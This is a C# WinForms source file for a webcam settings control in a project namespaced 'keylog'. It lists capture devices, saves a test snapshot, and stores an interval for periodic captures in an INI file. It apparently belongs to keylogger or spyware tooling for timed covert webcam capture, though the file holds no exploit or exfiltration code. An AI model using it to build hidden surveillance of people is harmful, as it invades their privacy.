using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using AForge.Video.DirectShow;
using System.Drawing.Imaging;
using System.Threading;
using tt;

namespace keylog
{
    public partial class Webcam : UserControl
    {
        FilterInfoCollection videoDevices;
        public Webcam()
        {
            InitializeComponent();
            try
            {
                // enumerate video devices
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                if (videoDevices.Count == 0)
                    throw new ApplicationException();

                // add all devices to combo
                foreach (FilterInfo device in videoDevices)
                {
                    devicesCombo.Items.Add(device.Name);
                }
            }
            catch (ApplicationException)
            {
                devicesCombo.Items.Add("No local capture devices");
                devicesCombo.Enabled = false;
                bt_test.Enabled = false;
            }

            devicesCombo.SelectedIndex = 0;

            //VideoCaptureDevice videoCaptureSource = new VideoCaptureDevice(videoDevices[devicesCombo.SelectedIndex].MonikerString);
            ////videoSourcePlayer.VideoSource = videoCaptureSource;
            ////videoSourcePlayer.Start();
            ////Bitmap picture = videoSourcePlayer.GetCurrentVideoFrame();

        }
        private void btnMR_OK_Click(object sender, EventArgs e)
        {
            Dictionary<string, string> d = new Dictionary<string, string>();
            if (cb_enable.Checked == false)
            {
                d.Add("Enable", "false");
                d.Add("Hours", tb_hours.Text);
                d.Add("Minutes", tb_minutes.Text);
            }
            else
            {

                if (tb_hours.Text.Trim() == "" || tb_hours.Text.All(char.IsDigit) == false)
                    tb_hours.Text = "1";

                if (tb_minutes.Text.Trim() == "" || tb_minutes.Text.All(char.IsDigit) == false)
                    tb_minutes.Text = "30";

                int iHours;
                Int32.TryParse(tb_hours.Text.Trim(), out iHours);
                int iMinutes;
                Int32.TryParse(tb_minutes.Text.Trim(), out iMinutes);
                if (iMinutes > 3601 || iHours > 3601 || iMinutes <= 0 || iHours < 0)
                {
                    MessageBox.Show("Value hours from 0 to 3600 \r\n Value minutes from 1 to 3600", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                d.Add("Enable", "true");
                d.Add("Hours", tb_hours.Text);
                d.Add("Minutes", tb_minutes.Text);
            }

            using (StreamWriter file = new StreamWriter("Webcam_config.ini"))
                foreach (var entry in d)
                    file.WriteLine("{0},{1}", entry.Key, entry.Value);

        }

        private void bt_test_Click(object sender, EventArgs e)
        {

            VideoCaptureDevice videoCaptureSource = new VideoCaptureDevice(videoDevices[devicesCombo.SelectedIndex].MonikerString);
            videoSourcePlayer.VideoSource = videoCaptureSource;
            videoSourcePlayer.Start();
            Thread.Sleep(1000);
            if (videoSourcePlayer.GetCurrentVideoFrame() != null)
            {
                Bitmap picture = videoSourcePlayer.GetCurrentVideoFrame();
                DateTime time = DateTime.Now;              // Use current time
                string format = "MMM ddd d HH mm yyyy";    // Use this format
                String strFilename = "Testing_Capture-" + time.ToString(format) + ".jpg";
                if (videoSourcePlayer.IsRunning)
                {
                    Bitmap objBitmap = new Bitmap(picture, new Size(409, 205));
                    pictureBox1.Image = objBitmap;
                    picture.Save(strFilename, ImageFormat.Jpeg);
                    videoSourcePlayer.Stop();
                    // MessageBox.Show("Saved");
                    Console.WriteLine("Webcam test ok!!!!");
                }
            }

        }

        private void Webcam_Load(object sender, EventArgs e)
        {
            if (File.Exists("Webcam_config.ini"))
            {
                Dictionary<string, string> wc_conf = new Dictionary<string, string>();
                Functions.Load_File("Webcam_config.ini", wc_conf);
                cb_enable.Checked = Boolean.Parse(wc_conf["Enable"].ToString());
                tb_hours.Text = wc_conf["Hours"].ToString();
                tb_minutes.Text = wc_conf["Minutes"].ToString();

            }
        }
    }
}
